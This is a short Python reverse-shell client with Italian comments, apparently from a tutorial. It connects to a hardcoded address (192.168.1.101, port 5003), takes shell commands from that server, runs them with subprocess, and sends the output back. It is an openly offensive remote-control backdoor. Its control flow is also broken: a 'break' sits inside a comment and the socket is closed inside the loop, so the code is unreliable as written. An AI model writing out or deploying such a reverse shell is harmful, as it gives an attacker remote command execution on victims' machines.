import socket, os, subprocess 
SERVER_HOST = "192.168.1.101" # Imposta l'indirizzo IP del server e la porta a cui il client si connetterà 
SERVER_PORT = 5003 
client_socket = socket.socket() # Crea un socket client 
client_socket.connect((SERVER_HOST, SERVER_PORT)) # Il client si connette al server specificato 
while True: # Ricevi il comando dal server ciclo while True, in cui continua a ricevere comandi dal server 
    command = client_socket.recv(1024).decode() # Riceve un comando dal server La funzione recv attende fino a 1024 byte di dati, che poi decodifica da bytes a stringa. 
    if command.lower() == "exit": # Se il comando ricevuto è "exit", il ciclo si interrompe e la connessione viene chiusa break # Esegue il comando e recupera i risultati 
        if command.startswith("cd"): # Se il comando inizia con "cd", viene trattato separatamente per cambiare la directory corrente del processo con os.chdir(). Questo è necessario perché subprocess.getoutput() non gestisce nativamente i cambi di directory 
            try: 
                os.chdir(command.strip('cd ')) 
                client_socket.send('Changed directory'.encode()) # In caso di successo, invia al server una conferma ("Changed directory"). 
            except FileNotFoundError as e: # Se la directory non esiste (FileNotFoundError), invia un messaggio di errore al server. 
                client_socket.send(str(e).encode()) 
        else: output = subprocess.getoutput(command) # Per tutti gli altri comandi, usa subprocess.getoutput(command) per eseguirli. Questa funzione esegue il comando nel shell, cattura l'output e lo restituisce come stringa. 
        client_socket.send(output.encode()) 
        client_socket.close()